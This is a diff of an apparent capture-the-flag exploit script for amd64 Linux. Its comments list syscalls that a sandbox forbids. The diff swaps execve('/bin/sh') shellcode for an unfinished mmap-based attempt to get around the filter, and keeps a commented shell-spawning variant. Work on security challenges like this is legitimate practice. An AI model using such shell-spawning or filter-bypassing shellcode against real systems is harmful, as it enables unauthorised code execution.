@@ -1,5 +1,5 @@
 ''' 
-autorisé :
+interdits :
 0X2 -> open
 0X101 -> openat
 0X3B -> execve
@@ -7,7 +7,7 @@ autorisé :
 0X39 -> fork
 0X3a -> vfork
 0X38 -> clone
-0X1B3 ??
+0X1B3 ?? -> write ?
 0X28 -> sendfile
 0XA1 -> chroot
 0X29 -> socket
@@ -19,13 +19,23 @@ from pwn import *
 context.arch = 'amd64'
 context.os = 'linux'
 
+
+# shellcode = asm("""
+#     mov     rbx, 0X68732f6e69622f
+#     push rbx
+#     mov rbx, rsp
+#     mov     rax, 0x0B
+#     int 0x80
+# """)
+
 shellcode = asm("""
-    mov     rbx, 0x68732F6E69622F
-    push    rbx
-    mov     rdi, rsp
-    xor     rsi, rsi
-    xor     rdx, rdx
-    mov     rax, 0X3B
+    mov     rdi, 0x400000
+    mov     rsi, 4096
+    mov rdx, 0xFFFFFFFF
+    mov rcx, 0
+    mov rax, 0x9
+    syscall
+    mov rdi, rax
     syscall
 """)
 
